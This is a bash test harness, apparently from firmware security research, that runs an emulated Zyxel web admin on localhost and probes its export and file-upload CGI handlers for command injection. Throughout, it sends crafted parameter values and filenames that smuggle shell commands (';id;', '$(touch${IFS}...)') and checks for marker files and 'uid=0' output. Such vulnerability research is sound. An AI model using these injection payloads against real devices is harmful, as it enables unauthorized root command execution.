#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$ROOT_DIR/tools/zyxel_bwrap_env.sh"
source "$ROOT_DIR/tools/zyxel_manual_core_lane.sh"

RUNROOT="$ROOT_DIR/runroot"
STATE_DIR="$ROOT_DIR/.lab-state"
ARTIFACT_ROOT="$ROOT_DIR/live_artifacts"
LABEL="${1:-admin_web_handler_focus_20260422a}"
ARTIFACT_DIR="$ARTIFACT_ROOT/$LABEL"
SUMMARY_OUT="$ARTIFACT_DIR/summary.txt"
SAMPLE_DIR="$ARTIFACT_DIR/samples"

MARKER_CFG="ADMIN_WEB_CFG_MARKER"
MARKER_SCRIPT="ADMIN_WEB_SCRIPT_MARKER"
MARKER_CERT="ADMIN_WEB_CERT_MARKER"
HTTP_MARKER="HTTP_EXPORT_MARKER"

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "Missing dependency: $1" >&2
    exit 1
  }
}

ensure_file() {
  local path="$1"
  [[ -f "$path" ]] || : >"$path"
}

http_code() {
  local path="$1"
  if [[ -f "$path" ]]; then
    awk 'NR==1 {print $2}' "$path"
  fi
}

body_has() {
  local path="$1"
  local needle="$2"
  grep -aFq "$needle" "$path" 2>/dev/null
}

yn_has() {
  local path="$1"
  local needle="$2"
  if body_has "$path" "$needle"; then
    echo yes
  else
    echo no
  fi
}

stop_lab() {
  zyxel_stop_manual_core_lane
  "$ROOT_DIR/tools/run_zyxel_lab.sh" stop >/dev/null 2>&1 || true
}

prepare_clean_core() {
  mkdir -p "$ARTIFACT_DIR"
  "$ROOT_DIR/tools/run_zyxel_lab.sh" stop >"$ARTIFACT_DIR/pre_rebuild_stop.log" 2>&1 || true
  "$ROOT_DIR/tools/run_zyxel_lab.sh" rebuild --phase core >"$ARTIFACT_DIR/rebuild_core.log" 2>&1
  "$ROOT_DIR/tools/run_zyxel_lab.sh" health --phase core >"$ARTIFACT_DIR/health_core.log" 2>&1
  "$ROOT_DIR/tools/run_zyxel_lab.sh" stop >"$ARTIFACT_DIR/post_health_stop.log" 2>&1 || true
}

prepare_samples() {
  mkdir -p "$SAMPLE_DIR"
  cat >"$SAMPLE_DIR/sample.conf" <<'EOF'
interface-name ge1 lan1
hostname admin-web-focus
EOF
  cat >"$SAMPLE_DIR/sample.zysh" <<'EOF'
show version
EOF
  cp -f "$RUNROOT/db/etc/zyxel/ftp/cert/default.pem" "$SAMPLE_DIR/sample_cert.pem"
}

clear_markers() {
  find "$RUNROOT" -type f \
    \( -name "$MARKER_CFG" -o -name "$MARKER_SCRIPT" -o -name "$MARKER_CERT" \) \
    -delete 2>/dev/null || true
}

record_markers() {
  local outfile="$1"
  find "$RUNROOT" -type f \
    \( -name "$MARKER_CFG" -o -name "$MARKER_SCRIPT" -o -name "$MARKER_CERT" \) \
    | sed "s#^$RUNROOT/##" \
    | LC_ALL=C sort >"$outfile" || true
}

snapshot_manifest() {
  local outfile="$1"
  : >"$outfile"
  while IFS= read -r file; do
    printf '%s\t%s\n' "${file#$RUNROOT/}" "$(wc -c <"$file" | tr -d ' ')" >>"$outfile"
  done < <(
    find \
      "$RUNROOT/db/etc/zyxel/ftp" \
      "$RUNROOT/etc/zyxel/ftp" \
      "$RUNROOT/tmp" \
      -type f 2>/dev/null | LC_ALL=C sort
  )
}

http_get_case() {
  local name="$1"
  shift
  local prefix="$ARTIFACT_DIR/$name"
  curl -sS --max-time 20 \
    -D "${prefix}.headers.txt" \
    -o "${prefix}.body.bin" \
    -H 'Host: 127.0.0.1:8080' \
    --cookie 'authtok=admin0' \
    --get \
    "$@" \
    'http://127.0.0.1:8080/cgi-bin/export-cgi' || true
  ensure_file "${prefix}.headers.txt"
  ensure_file "${prefix}.body.bin"
}

http_post_upload_case() {
  local name="$1"
  shift
  local prefix="$ARTIFACT_DIR/$name"
  curl -sS --max-time 20 \
    -D "${prefix}.headers.txt" \
    -o "${prefix}.body.bin" \
    -H 'Host: 127.0.0.1:8080' \
    --cookie 'authtok=admin0' \
    -X POST \
    "$@" \
    'http://127.0.0.1:8080/cgi-bin/file_upload-cgi' || true
  ensure_file "${prefix}.headers.txt"
  ensure_file "${prefix}.body.bin"
}

need_cmd curl
need_cmd qemu-aarch64-static
need_cmd bwrap
need_cmd python3

mkdir -p "$ARTIFACT_DIR"
trap stop_lab EXIT

prepare_clean_core
prepare_samples
clear_markers
snapshot_manifest "$ARTIFACT_DIR/before.manifest.tsv"

zyxel_start_manual_core_lane "$ROOT_DIR" "$RUNROOT" "$STATE_DIR" 0 admin0 "${LABEL}_admin" >"$ARTIFACT_DIR/start_core.log" 2>&1
cp -f "$STATE_DIR/${LABEL}_admin_zyshd_wd.log" "$ARTIFACT_DIR/core_health.log" 2>/dev/null || : >"$ARTIFACT_DIR/core_health.log"
zyxel_start_manual_lighttpd "$RUNROOT" "$STATE_DIR" "${LABEL}_admin" >"$ARTIFACT_DIR/manual_lighttpd.log" 2>&1

http_get_case export_config_plain \
  --data-urlencode 'category=config' \
  --data-urlencode 'arg0=startup-config.conf'

http_get_case export_pkcs12_plain \
  --data-urlencode 'category=pkcs12' \
  --data-urlencode 'arg0=default' \
  --data-urlencode 'arg1=testpass'

http_get_case export_pkcs12_semicolon_control \
  --data-urlencode 'category=pkcs12' \
  --data-urlencode 'arg0=default' \
  --data-urlencode "arg1=testpass;id;echo ${HTTP_MARKER}"

http_get_case export_pkcs12_quote_inject \
  --data-urlencode 'category=pkcs12' \
  --data-urlencode 'arg0=default' \
  --data-urlencode "arg1=x\";id;echo ${HTTP_MARKER};#"

cfg_inject_name="cfg\$(touch\${IFS}${MARKER_CFG}).conf"
script_inject_name="script\$(touch\${IFS}${MARKER_SCRIPT}).zysh"
cert_inject_pw="\$(touch\${IFS}${MARKER_CERT})"

http_post_upload_case upload_config_plain \
  -F "file_path=@$SAMPLE_DIR/sample.conf;filename=sample.conf" \
  -F 'file_type=config' \
  -F 'nv=1' \
  -F 'vn=1'

http_post_upload_case upload_config_filename_inject \
  -F "file_path=@$SAMPLE_DIR/sample.conf;filename=$cfg_inject_name" \
  -F 'file_type=config' \
  -F 'nv=1' \
  -F 'vn=1'

http_post_upload_case upload_script_filename_inject \
  -F "file_path=@$SAMPLE_DIR/sample.zysh;filename=$script_inject_name" \
  -F 'file_type=script' \
  -F 'nv=1' \
  -F 'vn=1'

http_post_upload_case upload_certlocal_plain \
  -F "file_path=@$SAMPLE_DIR/sample_cert.pem;filename=sample_cert.pem" \
  -F 'file_type=certlocal' \
  -F 'ci_pw=testpass' \
  -F 'nv=1' \
  -F 'vn=1'

http_post_upload_case upload_certlocal_ci_pw_inject \
  -F "file_path=@$SAMPLE_DIR/sample_cert.pem;filename=sample_cert.pem" \
  -F 'file_type=certlocal' \
  -F "ci_pw=$cert_inject_pw" \
  -F 'nv=1' \
  -F 'vn=1'

snapshot_manifest "$ARTIFACT_DIR/after.manifest.tsv"
diff -u "$ARTIFACT_DIR/before.manifest.tsv" "$ARTIFACT_DIR/after.manifest.tsv" >"$ARTIFACT_DIR/manifest.diff.txt" || true
record_markers "$ARTIFACT_DIR/marker_hits.txt"
cp -f "$STATE_DIR/${LABEL}_admin_lighttpd.log" "$ARTIFACT_DIR/lighttpd.log" 2>/dev/null || cp -f "$STATE_DIR/lighttpd.log" "$ARTIFACT_DIR/lighttpd.log" 2>/dev/null || : >"$ARTIFACT_DIR/lighttpd.log"
stop_lab >"$ARTIFACT_DIR/post_stop.log" 2>&1 || true
trap - EXIT

{
  echo "result_class=admin_web_handler_focus"
  echo "date=2026-04-22"
  echo "export_config_plain_http=$(http_code "$ARTIFACT_DIR/export_config_plain.headers.txt")"
  echo "export_pkcs12_plain_http=$(http_code "$ARTIFACT_DIR/export_pkcs12_plain.headers.txt")"
  echo "export_pkcs12_semicolon_control_http=$(http_code "$ARTIFACT_DIR/export_pkcs12_semicolon_control.headers.txt")"
  echo "export_pkcs12_quote_inject_http=$(http_code "$ARTIFACT_DIR/export_pkcs12_quote_inject.headers.txt")"
  echo "export_pkcs12_semicolon_marker=$(yn_has "$ARTIFACT_DIR/export_pkcs12_semicolon_control.body.bin" "$HTTP_MARKER")"
  echo "export_pkcs12_quote_marker=$(yn_has "$ARTIFACT_DIR/export_pkcs12_quote_inject.body.bin" "$HTTP_MARKER")"
  echo "export_pkcs12_quote_uid0=$(yn_has "$ARTIFACT_DIR/export_pkcs12_quote_inject.body.bin" "uid=0")"
  echo "upload_config_plain_http=$(http_code "$ARTIFACT_DIR/upload_config_plain.headers.txt")"
  echo "upload_config_filename_inject_http=$(http_code "$ARTIFACT_DIR/upload_config_filename_inject.headers.txt")"
  echo "upload_script_filename_inject_http=$(http_code "$ARTIFACT_DIR/upload_script_filename_inject.headers.txt")"
  echo "upload_certlocal_plain_http=$(http_code "$ARTIFACT_DIR/upload_certlocal_plain.headers.txt")"
  echo "upload_certlocal_ci_pw_inject_http=$(http_code "$ARTIFACT_DIR/upload_certlocal_ci_pw_inject.headers.txt")"
  echo
  echo "[export-cgi]"
  echo "- quote inject body marker: $(yn_has "$ARTIFACT_DIR/export_pkcs12_quote_inject.body.bin" "$HTTP_MARKER")"
  echo "- quote inject uid=0: $(yn_has "$ARTIFACT_DIR/export_pkcs12_quote_inject.body.bin" "uid=0")"
  echo "- semicolon-only control marker: $(yn_has "$ARTIFACT_DIR/export_pkcs12_semicolon_control.body.bin" "$HTTP_MARKER")"
  echo
  echo "[file_upload-cgi]"
  echo "- marker hits:"
  if [[ -s "$ARTIFACT_DIR/marker_hits.txt" ]]; then
    sed 's/^/  - /' "$ARTIFACT_DIR/marker_hits.txt"
  else
    echo "  - none"
  fi
  echo
  echo "[interesting bodies]"
  for name in \
    export_pkcs12_quote_inject \
    export_pkcs12_semicolon_control \
    upload_config_filename_inject \
    upload_script_filename_inject \
    upload_certlocal_ci_pw_inject
  do
    echo "- $name:"
    strings -a "$ARTIFACT_DIR/${name}.body.bin" | sed -n '1,8p' | sed 's/^/  /'
  done
  echo
  echo "[artifacts]"
  echo "- $ARTIFACT_DIR"
} >"$SUMMARY_OUT"

printf 'Summary: %s\n' "$SUMMARY_OUT"
